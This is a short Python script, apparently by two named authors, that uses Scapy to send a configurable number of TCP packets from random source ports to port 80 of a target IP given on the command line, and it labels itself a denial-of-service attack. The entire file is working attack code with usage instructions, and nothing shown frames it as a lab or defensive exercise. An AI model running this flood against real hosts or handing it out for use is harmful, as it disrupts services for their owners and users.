"""
@author Tristan Guerin & Grégoire Philippe
@version 1
"""
# Attack DOS : Single IP multiple Port

from scapy.all import *
from scapy.layers.inet import IP, TCP
import sys
from datetime import datetime

if(len(sys.argv)<4):
    print("Usage : attackDOS.py <yourIP> <ipToDos> <numberOfRequest> [intervalInMilliseconds]")
    sys.exit()
i = 0
source_IP = str(sys.argv[1])
target_IP = str(sys.argv[2])
number_request = float(sys.argv[3])
interval = 0

if(len(sys.argv)>4):
    interval = float(sys.argv[4])

while i<number_request:
    IP1 = IP(src=source_IP, dst=target_IP)
    source_port = random.randint(1,65500)
    TCP1 = TCP(sport=source_port, dport=80)
    pkt = IP1 / TCP1
    send(pkt, inter=.001)
    time.sleep(interval/float(1000))
    print(str(datetime.now()))
    print("packet sent "+str(i)+ " to "+target_IP+" from port "+str(source_port))
    i = i + 1


